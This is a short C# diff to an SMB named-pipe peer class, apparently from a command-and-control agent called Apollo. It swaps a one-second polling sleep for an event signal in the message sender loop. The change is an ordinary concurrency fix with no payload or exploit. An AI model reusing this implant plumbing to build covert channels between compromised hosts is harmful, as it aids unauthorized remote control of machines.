@@ -24,6 +24,7 @@ namespace Apollo.Peers.SMB
         private bool _expectEKE;
         private ConcurrentDictionary<string, IPCMessageStore> _messageOrganizer = new ConcurrentDictionary<string, IPCMessageStore>();
         private ConcurrentQueue<byte[]> _senderQueue = new ConcurrentQueue<byte[]>();
+        private AutoResetEvent _senderEvent = new AutoResetEvent(false);
         private Action<object> _sendAction;
         private TTasks.Task _sendTask;
         private MessageType _serverResponseType;
@@ -36,13 +37,10 @@ namespace Apollo.Peers.SMB
             {
                 while (((PipeStream)p).IsConnected)
                 {
+                    _senderEvent.WaitOne();
                     if (_senderQueue.TryDequeue(out byte[] result))
                     {
                         ((PipeStream)p).BeginWrite(result, 0, result.Length, OnAsyncMessageSent, p);
-                    }
-                    else
-                    {
-                        Thread.Sleep(1000);
                     }
                 }
             };
@@ -132,6 +130,7 @@ namespace Apollo.Peers.SMB
             {
                 _senderQueue.Enqueue(Encoding.UTF8.GetBytes(_serializer.Serialize(chunk)));
             }
+            _senderEvent.Set();
         }
 
         public override bool Start()
